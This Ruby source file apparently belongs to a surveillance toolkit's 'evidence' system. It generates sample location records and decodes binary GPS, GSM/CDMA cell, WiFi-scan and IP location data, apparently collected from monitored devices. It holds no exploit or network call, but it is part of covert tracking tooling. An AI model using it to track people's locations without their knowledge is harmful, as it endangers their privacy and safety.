require 'rcs-common/evidence/common'

require 'digest/md5'

module RCS

module PositionEvidence

  ELEM_DELIMITER = 0xABADC0DE

  LOCATION_VERSION = 2010082401
	LOCATION_GPS	= 0x0001
	LOCATION_GSM	= 0x0002
	LOCATION_WIFI	= 0x0003
	LOCATION_IP		= 0x0004
	LOCATION_CDMA	= 0x0005
  
  def content
    content = StringIO.new
    
    case @loc_type
      when LOCATION_GPS
        content.write [@loc_type, 0, 0].pack('L*')
        content.write Time.now.getutc.to_filetime.pack('L*')
        content.write GPS_Position.struct(45.12345, 9.54321)
        content.write [ ELEM_DELIMITER ].pack('L')

      when LOCATION_GSM, LOCATION_CDMA
        content.write [@loc_type, 0, 0].pack('L*')
        content.write Time.now.getutc.to_filetime.pack('L*')
        content.write CELL_Position.struct(222, 1, 61208, 528, -92, 0)
        content.write [ ELEM_DELIMITER ].pack('L')

      when LOCATION_WIFI
        content.write ["\xAA\xBB\xCC\xDD\xEE\xFF", "\x00\x11\x22\x33\x44\x55", "\xAB\xCD\xEF\x01\x23\x45"].sample
        content.write [0, 0].pack('C*') # dummy for the C struck packing
        content.write [4].pack('L')
        content.write ["ciao", "miao", "blau"].sample.ljust(32, "\x00")
        content.write [rand(100) * -1].pack('l')

      when LOCATION_IP
        content.write ["8.8.8.8", "8.8.4.4", "4.2.2.2"].sample
    end

    content.string
  end

  def generate_content
    ret = Array.new
    @nstruct.times { ret << content() }
    ret
  end

  def additional_header
    @loc_type = [LOCATION_GPS, LOCATION_GSM, LOCATION_CDMA, LOCATION_WIFI, LOCATION_IP].sample
    @nstruct = (@loc_type == LOCATION_IP) ? 1 : rand(5) + 1
    header = StringIO.new
    header.write [LOCATION_VERSION, @loc_type, @nstruct].pack("I*")
    
    header.string
  end

  def decode_additional_header(data)
    raise EvidenceDeserializeError.new("incomplete LOCATION") if data.nil? or data.size == 0

    binary = StringIO.new data

    version, type, number = binary.read(12).unpack("I*")
    raise EvidenceDeserializeError.new("invalid log version for LOCATION") unless version == LOCATION_VERSION

    ret = Hash.new
    ret[:loc_type] = type
    return ret
  end

  def decode_content(common_info, chunks)
    stream = StringIO.new chunks.join

    case common_info[:loc_type]
      when LOCATION_WIFI
        info = Hash[common_info]
        info[:data] ||= Hash.new
        info[:data][:type] = 'WIFI'
        info[:data][:wifi] = []
        until stream.eof?
          # we have 6 byte of mac address
          # and 2 of padding (using C struct is BAAAAD)
          mac = stream.read 6
          stream.read 2

          len = stream.read(4).unpack('L').first
          ssid = stream.read(len)
          
          stream.read(32-len)
          sig = stream.read(4).unpack('l').first

          mac_s = "%02X:%02X:%02X:%02X:%02X:%02X" %
                              [mac[0].unpack('C').first,
                               mac[1].unpack('C').first,
                               mac[2].unpack('C').first,
                               mac[3].unpack('C').first,
                               mac[4].unpack('C').first,
                               mac[5].unpack('C').first]

          info[:data][:wifi] << {:mac => mac_s, :sig => sig, :ssid => ssid}
        end
        yield info if block_given?

      when LOCATION_IP
        info = Hash[common_info]
        info[:data] ||= Hash.new
        info[:data][:type] = 'IPv4'
        ip = stream.read_ascii_string
        info[:data][:ip] = ip unless ip.nil?
        yield info if block_given?

      when LOCATION_GPS
        until stream.eof?
          info = Hash[common_info]
          info[:data] ||= Hash.new
          info[:data][:type] = 'GPS'
          type, size, version = stream.read(12).unpack('L*')
          low, high = *stream.read(8).unpack('L*')
          info[:da] = Time.from_filetime(high, low)
          gps = GPS_Position.new
          gps.read stream
          info[:data][:latitude] = "%.7f" % gps.latitude
          info[:data][:longitude] = "%.7f" % gps.longitude
          info[:data][:accuracy] = "%.7f" % gps.accuracy
          delim = stream.read(4).unpack('L').first
          raise EvidenceDeserializeError.new("Malformed LOCATION GPS (missing delimiter)") unless delim == ELEM_DELIMITER
          yield info if block_given?
        end

      when LOCATION_GSM, LOCATION_CDMA
        until stream.eof?
          info = Hash[common_info]
          info[:data] ||= Hash.new
          info[:data][:type] = (info[:loc_type] == LOCATION_GSM) ? 'GSM' : 'CDMA'
          type, size, version = stream.read(12).unpack('L*')
          low, high = *stream.read(8).unpack('L*')
          info[:da] = Time.from_filetime(high, low)
          cell = CELL_Position.new
          cell.read stream

          if info[:loc_type] == LOCATION_GSM then
            info[:data][:cell] = {:mcc => cell.mcc, :mnc => cell.mnc, :lac => cell.lac, :cid => cell.cid, :db => cell.db, :adv => cell.adv, :age => 0}
          else
            info[:data][:cell] = {:mcc => cell.mcc, :sid => cell.mnc, :nid => cell.lac, :bid => cell.cid, :db => cell.db, :adv => cell.adv, :age => 0}
          end

          delim = stream.read(4).unpack('L').first
          raise EvidenceDeserializeError.new("Malformed LOCATION CELL (missing delimiter)") unless delim == ELEM_DELIMITER
          yield info if block_given?
        end
      else
        raise EvidenceDeserializeError.new("Unsupported LOCATION type (#{info[:loc_type]})")
    end
    
    :delete_raw
  end
end

class GPS_Position

  attr_reader :latitude
  attr_reader :longitude
  attr_reader :accuracy
  
  def self.size
    self.struct(0,0).bytesize
  end

  def self.struct(lat, long)
    str = ''
    str += [0].pack('l')  # DWORD dwVersion;  Current version of GPSID client is using.
    str += [0].pack('l')  # DWORD dwSize;     sizeof(_GPS_POSITION)
    str += [0].pack('l')  # DWORD dwValidFields;
    str += [0].pack('l')  # DWORD dwFlags;
    str += Array.new(8,0).pack('s*')  # SYSTEMTIME stUTCTime; 	UTC according to GPS clock.
    str += [lat].pack('D')  # double dblLatitude;          // Degrees latitude.  North is positive
    str += [long].pack('D') # double dblLongitude;         // Degrees longitude.  East is positive

    str += [0].pack('F')  # float  flSpeed;                // Speed in knots
    str += [0].pack('F')  # float  flHeading;              // Degrees heading (course made good).  True North=0
    str += [0].pack('D')  # double dblMagneticVariation;   // Magnetic variation.  East is positive
    str += [0].pack('F')  # float  flAltitudeWRTSeaLevel;  // Altitute with regards to sea level, in meters
    str += [0].pack('F')  # float  flAltitudeWRTEllipsoid; // Altitude with regards to ellipsoid, in meters

    str += [0].pack('l')  # GPS_FIX_QUALITY     FixQuality;        // Where did we get fix from?
    str += [0].pack('l')  # GPS_FIX_TYPE        FixType;           // Is this 2d or 3d fix?
    str += [0].pack('l')  # GPS_FIX_SELECTION   SelectionType;     // Auto or manual selection between 2d or 3d mode
    str += [0].pack('F')  # float flPositionDilutionOfPrecision;   // Position Dilution Of Precision
    str += [0].pack('F')  # float flHorizontalDilutionOfPrecision; // Horizontal Dilution Of Precision
    str += [0].pack('F')  # float flVerticalDilutionOfPrecision;   // Vertical Dilution Of Precision

    str += [1].pack('l')  # DWORD dwSatelliteCount;                // Number of satellites used in solution
    str += Array.new(12,0).pack('l*')  # DWORD rgdwSatellitesUsedPRNs[GPS_MAX_SATELLITES];                  // PRN numbers of satellites used in the solution
    str += [0].pack('l')  # DWORD dwSatellitesInView;                      	                                // Number of satellites in view.  From 0-GPS_MAX_SATELLITES
    str += Array.new(12,0).pack('l*')  # DWORD rgdwSatellitesInViewPRNs[GPS_MAX_SATELLITES];                // PRN numbers of satellites in view
    str += Array.new(12,0).pack('l*')  # DWORD rgdwSatellitesInViewElevation[GPS_MAX_SATELLITES];           // Elevation of each satellite in view
    str += Array.new(12,0).pack('l*')  # DWORD rgdwSatellitesInViewAzimuth[GPS_MAX_SATELLITES];             // Azimuth of each satellite in view
    str += Array.new(12,0).pack('l*')  # DWORD rgdwSatellitesInViewSignalToNoiseRatio[GPS_MAX_SATELLITES];  // Signal to noise ratio of each satellite in view

    return str
  end

  def read(stream)
    stream.read(4*4)
    stream.read(8*2)
    @latitude = stream.read(8).unpack('D').first
    @longitude = stream.read(8).unpack('D').first
    stream.read(2*4)
    stream.read(8)
    stream.read(2*4)

    stream.read(3*4)
    stream.read(4)                                # PDOP
    @accuracy = stream.read(4).unpack('F').first  # HDOP
    stream.read(4)                                # VDOP

    stream.read(4)
    stream.read(12*4)
    stream.read(4)
    stream.read(12*4)
    stream.read(12*4)
    stream.read(12*4)
    stream.read(12*4)
  end
end


class CELL_Position

  attr_reader :mcc, :mnc, :lac, :cid, :db, :adv
  
  def self.size
    self.struct(0,0,0,0,0,0).bytesize
  end

  def self.struct(mcc, mnc, lac, cid, db, adv)
    str = ''
    str += [0].pack('l')    # DWORD cbSize;                       // @field structure size in bytes
    str += [0].pack('l')    # DWORD dwParams;                     // @field indicates valid parameters
    str += [mcc].pack('l')  # DWORD dwMobileCountryCode;          // @field TBD
    str += [mnc].pack('l')  # DWORD dwMobileNetworkCode;          // @field TBD
    str += [lac].pack('l')  # DWORD dwLocationAreaCode;           // @field TBD
    str += [cid].pack('l')  # DWORD dwCellID;                     // @field TBD
    str += [0].pack('l')    # DWORD dwBaseStationID;              // @field TBD
    str += [0].pack('l')    # DWORD dwBroadcastControlChannel;    // @field TBD
    str += [db].pack('l')   # DWORD dwRxLevel;                    // @field Value from 0-63 (see GSM 05.08, 8.1.4)
    str += [0].pack('l')    # DWORD dwRxLevelFull;                // @field Value from 0-63 (see GSM 05.08, 8.1.4)
    str += [0].pack('l')    # DWORD dwRxLevelSub;                 // @field Value from 0-63 (see GSM 05.08, 8.1.4)
    str += [0].pack('l')    # DWORD dwRxQuality;                  // @field Value from 0-7  (see GSM 05.08, 8.2.4)
    str += [0].pack('l')    # DWORD dwRxQualityFull;              // @field Value from 0-7  (see GSM 05.08, 8.2.4)
    str += [0].pack('l')    # DWORD dwRxQualitySub;               // @field Value from 0-7  (see GSM 05.08, 8.2.4)
    str += [0].pack('l')    # DWORD dwIdleTimeSlot;               // @field TBD
    str += [adv].pack('l')  # DWORD dwTimingAdvance;              // @field TBD
    str += [0].pack('l')    # DWORD dwGPRSCellID;                 // @field TBD
    str += [0].pack('l')    # DWORD dwGPRSBaseStationID;          // @field TBD
    str += [0].pack('l')    # DWORD dwNumBCCH;                    // @field TBD
    str += Array.new(48,0).pack('C*')  # BYTE rgbBCCH[MAXLENGTH_BCCH];       // @field TBD
    str += Array.new(16,0).pack('C*')  # BYTE rgbNMR[MAXLENGTH_NMR];         // @field TBD
    return str  
  end

  def read(stream)
    stream.read(2*4) #size/params
    @mcc = stream.read(4).unpack('l').first
    @mnc = stream.read(4).unpack('l').first
    @lac = stream.read(4).unpack('l').first
    @cid = stream.read(4).unpack('l').first
    stream.read(2*4) # basestationid/broadcastcontrolchannel
    @db = stream.read(4).unpack('l').first # rxlevel
    stream.read(6*4) #rxlevelfull/rxlevelsub/rxquality/rxqualityfull/rxqualitysub/idletimeslot
    @adv = stream.read(4).unpack('l').first # timingadvance
    stream.read(3*4) # gprscellid / gprsbasestationid / dwnumbcch
    stream.read(48+16) # BCCH[48] / NMR[16]
  end

end

end # ::RCS